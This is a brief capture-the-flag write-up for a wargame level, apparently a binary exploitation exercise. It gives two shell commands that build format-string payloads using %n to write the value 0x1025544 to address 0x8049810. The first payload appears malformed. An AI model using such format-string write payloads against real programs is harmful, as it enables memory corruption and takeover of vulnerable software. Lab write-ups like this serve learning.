# level4

Pretty much the same as last level but we need to add width becasue the value we
want to write is very large.

## Useful infos

we want to write : 0x1025544 = 16930116
at address: 0x8049810 = \x10\x98\x04\x08

exploit: `echo -e "\x10\x98\x04\x08%16930112%12$n" > /tmp/exploit`
exploit: `echo -e "\x10\x98\x04\x08%16930052x%x%x%x%x%x%x%x%x%x%x%n" > /tmp/exploit`